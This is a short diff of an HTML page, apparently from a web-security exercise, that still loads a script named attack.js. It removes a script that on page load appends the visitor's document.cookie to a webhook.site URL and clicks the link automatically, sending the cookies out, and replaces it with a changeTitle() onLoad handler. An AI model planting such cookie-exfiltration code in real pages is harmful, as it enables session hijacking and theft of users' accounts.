@@ -5,17 +5,5 @@
     <script src="attack.js"></script>
 </head>
 
-    <a id="myLink" href="https://webhook.site/38ba9692-250b-438c-8533-896161eb3628">Click Me</a>
-
-    <script>
-        // Wait for the page to fully load
-        window.onload = function () {
-            // Find the link element by its ID
-            var link = document.getElementById('myLink');
-            link.href += '?cookie=' + document.cookie;
-
-            // Simulate a click event on the link
-            link.click();
-        };
-    </script>
+    <body onLoad="changeTitle()"></body>
 </html>
